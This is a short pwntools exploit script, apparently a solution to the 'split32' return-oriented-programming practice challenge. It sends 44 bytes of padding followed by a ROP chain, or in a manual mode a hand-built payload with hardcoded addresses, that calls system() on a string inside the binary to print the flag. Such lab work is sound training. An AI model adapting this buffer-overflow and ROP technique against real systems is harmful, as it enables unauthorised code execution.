from pwn import *
from sys import argv


if len(argv) > 1 and argv[1] == 'manual':

    system = p32(0x080483e0)
    bincat = p32(0x0804a030)

    print(b'A' * 44 + system + b'BBBB' + bincat +  b'\r')
    exit()

else:
    pass

elf = context.binary = ELF('split32')
p = process(elf.path)

system = elf.symbols.system
bincat = elf.symbols.usefulString

ropdata = ROP(elf)
ropdata.system(bincat)
info(ropdata.dump())
chain = ropdata.chain()

print(p.recvuntil(b'> ').decode())
p.sendline(b'A' * 44 + chain)
print(p.recvuntil('}').decode())
